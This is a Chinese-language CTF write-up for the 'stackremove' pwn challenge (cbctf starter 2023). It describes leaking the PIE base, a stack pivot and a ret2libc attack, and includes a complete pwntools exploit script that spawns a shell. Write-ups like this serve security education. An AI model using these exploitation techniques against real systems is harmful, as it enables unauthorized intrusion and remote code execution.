# stackremove

from cbctf starter 2023

## 文件分析

下载`stackremove`, NX on, PIE on, Canary off, RELRO full  
ghidra分析为64位程序

## 解题思路

栈上空间很大，但是溢出rbp的空间很小，因此考虑栈迁移后ret2libc  
第一步先找到栈上一个有程序偏移的地址，利用`printf(..., buf + offset)`输入输入偏移后算出pieBase，
然后读取buf地址，方便栈迁移

具体过程讲解可以看newstar2023中的`stack_migration`Writeup

## 踩过的坑

1. `scanf`中的函数会执行`movaps ..., xmm0`，也会检查rsp！下次见到这个指令就要多加一个ret
2. 本地调试找的main函数获取pieBase，结果一连接，崩了，一检查发现pieBase不对，在栈上找了一个其他函数

## EXPLOIT

```python
from pwn import *
import LibcSearcher
sh = remote(???, 10043)
elf = ELF('stackremove')

# payload 1: get pieBase
sh.sendline(b'96') # locate __libc_csu_initAddr
sh.recvuntil(b'kie!') # skip
libcCsuAddr = u64(sh.recvline()[:6] + b'\0\0')

pieBase = libcCsuAddr - elf.symbols['__libc_csu_init']
putsPlt = pieBase + elf.plt['puts']
putsGot = pieBase + elf.got['puts']
popRdiAddr = pieBase + 0x953
leaveRetAddr = pieBase + 0x8ea
retAddr = pieBase + 0x8eb
mainAddr = pieBase + elf.symbols['main']

# print(hex(pieBase)) # check
sh.recvuntil(b':\n') # skip
space = int(sh.recvuntil(b'sh')[:14], 16)

# payload 2: migrate stack for the first time
sh.sendline(p64(popRdiAddr) + p64(putsGot) + p64(putsPlt) + p64(retAddr) + p64(mainAddr) + b'0'*0x38 + p64(space - 8) + p64(leaveRetAddr)) # scanf check rsp

sh.recvuntil(b'ot!\n') # skip
putsGotAddr = u64(sh.recvline()[:6] + b'\0\0')
libc = LibcSearcher.LibcSearcher('puts', putsGotAddr & 0xfff)
libcBase = putsGotAddr - libc.dump('puts')
systemAddr = libcBase + libc.dump('system')
shstrAddr = libcBase + libc.dump('str_bin_sh')

sh.sendline(b'0') # no need this time
sh.recvuntil(b':\n') # skip

# payload 3: run system
space = int(sh.recvline()[:14], 16)
sh.sendline(p64(popRdiAddr) + p64(shstrAddr) + p64(systemAddr) + b'0'*0x48 + p64(space - 8) + p64(leaveRetAddr))

sh.interactive()
```

Done.
